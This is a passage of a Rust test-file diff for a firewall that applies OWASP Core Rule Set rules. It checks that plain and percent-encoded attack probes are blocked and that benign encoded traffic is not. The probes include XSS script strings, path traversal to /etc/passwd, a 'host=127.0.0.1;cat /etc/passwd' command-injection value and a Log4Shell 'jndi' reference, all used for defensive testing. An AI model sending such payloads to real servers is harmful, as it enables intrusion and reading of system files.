+                    headers: FORM_POST,
+                },
+                None,
+            ),
+            (
+                Probe {
+                    label: "XSS, encoded",
+                    method: "GET",
+                    path: "/",
+                    query: "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+                    body: "",
+                    headers: BROWSER,
+                },
+                None,
+            ),
+            (
+                Probe {
+                    label: "XSS, plain",
+                    method: "GET",
+                    path: "/",
+                    query: "q=<script>alert(1)</script>",
+                    body: "",
+                    headers: BROWSER,
+                },
+                None,
+            ),
+            (
+                Probe {
+                    label: "XSS in an encoded cookie",
+                    method: "GET",
+                    path: "/",
+                    query: "",
+                    body: "",
+                    headers: &[
+                        ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
+                        ("cookie", "theme=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
+                        ("host", "shop.example.com"),
+                    ],
+                },
+                None,
+            ),
+            (
+                Probe {
+                    label: "traversal, encoded path",
+                    method: "GET",
+                    path: "/static/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                    query: "",
+                    body: "",
+                    headers: BROWSER,
+                },
+                None,
+            ),
+            (
+                Probe {
+                    label: "traversal, plain path",
+                    method: "GET",
+                    path: "/static/../../etc/passwd",
+                    query: "",
+                    body: "",
+                    headers: BROWSER,
+                },
+                None,
+            ),
+            (
+                Probe {
+                    label: "traversal, encoded query",
+                    method: "GET",
+                    path: "/download",
+                    query: "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                    body: "",
+                    headers: BROWSER,
+                },
+                None,
+            ),
+            (
+                Probe {
+                    label: "shell command, encoded",
+                    method: "GET",
+                    path: "/ping",
+                    query: "host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd",
+                    body: "",
+                    headers: BROWSER,
+                },
+                None,
+            ),
+            (
+                Probe {
+                    label: "shell command, plain",
+                    method: "GET",
+                    path: "/ping",
+                    query: "host=127.0.0.1;cat /etc/passwd",
+                    body: "",
+                    headers: BROWSER,
+                },
+                None,
+            ),
+        ]
+    }
+
+    /// Every attack shape is blocked in *both* spellings.  The encoded column
+    /// is the regression: `${jndi:` written `%24%7Bjndi%3A` reached the origin
+    /// untouched while the identical plain payload was a 403.
+    #[test]
+    fn percent_encoded_attacks_are_blocked_like_their_plain_form() {
+        let checker = OWASPCheck::from_directory(&crs_dir());
+        for (probe, pinned) in attack_probes() {
+            let hit = verdict(&checker, probe, 1);
+            assert!(hit.is_some(), "attack probe not blocked at paranoia 1: {}", probe.label);
+            if let Some(expected) = pinned {
+                assert_eq!(hit.as_deref(), Some(*expected), "wrong rule fired for {}", probe.label);
+            }
+        }
+    }
+
+    /// The other half of the same change: nothing ordinary started blocking.
+    /// Every one of these carries a `%` or a `+` that a naive decode could turn
+    /// into an attack-looking string.
+    #[test]
+    fn ordinary_traffic_carrying_percent_encoding_is_not_blocked() {
+        let checker = OWASPCheck::from_directory(&crs_dir());
+        for probe in benign_probes() {
+            assert_eq!(
+                verdict(&checker, probe, 1),
+                None,
+                "false positive at the default paranoia level: {}",
+                probe.label
+            );
+        }
+    }
+
+    /// Paranoia 2 is not the default and is not clean, but its verdicts are
+    /// pinned so decoding work cannot quietly add to the list.
+    ///
+    /// Each entry below is a *pre-existing* converter defect unrelated to
+    /// decoding — CRS-920230 is `@rx %[0-9a-fA-F]{2}` (upstream: "an escape
+    /// survived `t:urlDecodeUni`", i.e. double encoding) evaluated against the
+    /// raw query, and the rest are rules upstream scopes to a single `ARGS`
+    /// member that this engine can only run against a whole surface.
+    #[test]
+    fn paranoia_2_false_positives_stay_at_the_recorded_baseline() {
+        let checker = OWASPCheck::from_directory(&crs_dir());
+        let expected: &[(&str, Option<&str>)] = &[
+            ("JSON body with escapes and a percent sign", Some("CRS-932240")),
+            ("encoded redirect_uri in the query", Some("CRS-920230")),
+            ("escaped percent sign (q=100%25)", Some("CRS-920230")),
+            ("multipart upload", Some("CRS-942180")),
+            ("encoded array indices in the query", Some("CRS-920230")),
+            ("search phrase using + as a space", Some("CRS-942200")),
+        ];
+        for probe in benign_probes() {
+            let want = expected
+                .iter()
+                .find(|(label, _)| *label == probe.label)
+                .and_then(|(_, id)| *id);
+            assert_eq!(
+                verdict(&checker, probe, 2).as_deref(),
+                want,
+                "paranoia 2 verdict changed for {}",
+                probe.label
+            );
+        }
+    }
+
+    /// `contains` is the one pattern operator deliberately left raw.
+    ///
+    /// CRS-920610 reads `REQUEST_URI_RAW` and fires on a literal `#` in the
+    /// URI; the whole point is that a *properly escaped* `%23` is fine.
+    /// Decoding this operator would turn every URL carrying an escaped hash
+    /// into a paranoia-1 block.
+    #[test]
+    fn contains_stays_raw_so_an_escaped_hash_is_not_a_raw_fragment() {
+        let checker = OWASPCheck::from_directory(&crs_dir());
+        let probe = |path: &'static str| Probe {
+            label: "hash",
+            method: "GET",
+            path,
+            query: "",
+            body: "",
+            headers: BROWSER,
+        };
+        assert_eq!(
+            verdict(&checker, &probe("/docs/chapter%231.html"), 1),
+            None,
+            "an escaped hash is a legal URI, not a raw fragment"
+        );
+        assert_eq!(
+            verdict(&checker, &probe("/docs/chapter#1.html"), 1).as_deref(),
+            Some("CRS-920610"),
+            "a raw fragment must still be caught"
+        );
+    }
+
+    /// Header surfaces are matched verbatim, as upstream does.
+    ///
+    /// CRS-932131 hunts the shell construct `/name[index]` in `User-Agent` /
+    /// `Referer`.  Any ordinary Referer holding `%5B0%5D` decodes into exactly
+    /// that, so decoding the header would block it — while the plain payload
+    /// the rule actually exists for still has to be caught.
+    #[test]
+    fn header_surfaces_are_matched_verbatim() {
+        let checker = OWASPCheck::from_directory(&crs_dir());
+        let with_referer = |referer: &'static str| Probe {
+            label: "referer",
+            method: "GET",
+            path: "/p/1",
+            query: "",
+            body: "",
+            headers: match referer {
+                "escaped" => &[
+                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
+                    ("referer", "https://shop.example.com/list/tags%5B0%5D/page%202"),
+                    ("host", "shop.example.com"),
+                ],
+                _ => &[
+                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
+                    ("referer", "https://shop.example.com/list/tags[0]/page 2"),
+                    ("host", "shop.example.com"),
+                ],
+            },
+        };
+        assert_eq!(
+            verdict(&checker, &with_referer("escaped"), 2),
+            None,
+            "an escaped Referer must not be decoded into a shell expression"
+        );
+        assert_eq!(
+            verdict(&checker, &with_referer("raw"), 2).as_deref(),
+            Some("CRS-932131"),
+            "the raw shell expression must still be caught"
+        );
+    }
+
+    /// `ModSecurity` `MATCHED_VARS` and `TX:N` hold the *transformed* value, so
+    /// a chain link and a capture must both see the text the head actually
+    /// matched — the decoded form, not the bytes off the wire.
+    #[test]
+    fn chain_links_and_captures_see_the_decoded_text() {
+        let capture_rule = "version: \"1.0\"\nrules:\n  - id: TEST-DECODED-CAPTURE\n    name: t\n    \
+             category: test\n    severity: critical\n    paranoia: 1\n    field: query\n    \
+             operator: regex\n    value: 'alpha (\\w+)'\n    capture: true\n    chain:\n      \
+             - field: tx:1\n        operator: equals\n        value: beta\n    action: block\n";
+        let checker = OWASPCheck::from_yaml(capture_rule);
+        assert_eq!(checker.rule_count(), 1);
+        // `q=alpha beta`, percent-encoded. A capture taken from the raw query
+        // would not exist at all, because the pattern does not match it.
+        assert!(
+            checker
+                .check(&make_ctx_with_query("q=%61%6c%70%68%61%20beta"))
+                .is_some(),
+            "tx:1 must carry the capture from the decoded value"
+        );
+
+        let matched_rule = "version: \"1.0\"\nrules:\n  - id: TEST-DECODED-MATCHED\n    name: t\n    \
+             category: test\n    severity: critical\n    paranoia: 1\n    field: query\n    \
+             operator: regex\n    value: alpha\n    chain:\n      - field: matched_value\n        \
+             operator: regex\n        value: '^q=alpha beta$'\n    action: block\n";
+        let chained = OWASPCheck::from_yaml(matched_rule);
+        assert_eq!(chained.rule_count(), 1);
+        assert!(
+            chained
+                .check(&make_ctx_with_query("q=%61%6c%70%68%61%20beta"))
+                .is_some(),
+            "matched_value must carry the decoded text the head matched"
+        );
+    }
+
+    /// The allow-list and numeric operators ignore encoding on purpose: a
+    /// method token cannot legally carry `%`, `content_length` is an integer
+    /// the engine itself renders, and decoding either could only widen what a
+    /// deny-by-default comparison rejects.
+    #[test]
+    fn allowlist_and_numeric_operators_ignore_encoding() {
+        let checker = OWASPCheck::from_directory(&crs_dir());
+        assert!(
+            checker.check(&make_ctx("GET", "/", 0)).is_none(),
+            "an allowed method stays allowed"
+        );
+        for spelled in ["FOOBAR", "%47%45%54", "GET%00"] {
+            assert!(
+                checker.check(&make_ctx(spelled, "/", 0)).is_some(),
+                "{spelled} is not in the CRS-911100 allow-list and must be blocked"
+            );
+        }
+        // CRS-920160: content_length over 10 MB. The value is `u64`-rendered,
+        // so there is nothing to decode either way.
+        assert!(checker.check(&make_ctx("GET", "/", 10_485_761)).is_some());
+        assert!(checker.check(&make_ctx("GET", "/", 1024)).is_none());
+    }
+
+    /// The word-at-a-time encoded-ness guard must agree with a plain byte scan
+    /// for every input — it decides whether a value is decoded at all, so a
+    /// false negative is a silent bypass.
+    #[test]
+    fn may_be_encoded_word_scan_agrees_with_a_byte_scan() {
+        fn naive(s: &str) -> bool {
+            s.bytes().any(|b| b == b'%' || b == b'+')
+        }
+        let mut cases: Vec<String> = vec![
+            String::new(),
+            "%".into(),
+            "+".into(),
+            "中文参数值没有转义".into(),
+            "\u{0}\u{1}\u{7f}\u{80}".into(),
+        ];
+        // A marker at every offset of every length across the 8-byte word
+        // boundary, plus the all-clear strings of the same lengths.
+        for len in 0..40usize {
+            let clear = "a".repeat(len);
+            cases.push(clear.clone());
+            for pos in 0..len {
+                for marker in ['%', '+'] {
+                    let mut s: Vec<char> = clear.chars().collect();
+                    if let Some(slot) = s.get_mut(pos) {
+                        *slot = marker;
+                    }
+                    cases.push(s.into_iter().collect());
+                }
+            }
+            // High-bit bytes stress the borrow trick's `& !word` term.
+            cases.push("\u{ff}".repeat(len));
+            cases.push(format!("{}%", "\u{80}".repeat(len)));
+        }
+        for case in &cases {
+            assert_eq!(
+                may_be_encoded(case),
+                naive(case),
+                "word scan disagrees for {case:?} (len {})",
+                case.len()
+            );
+        }
     }
 }
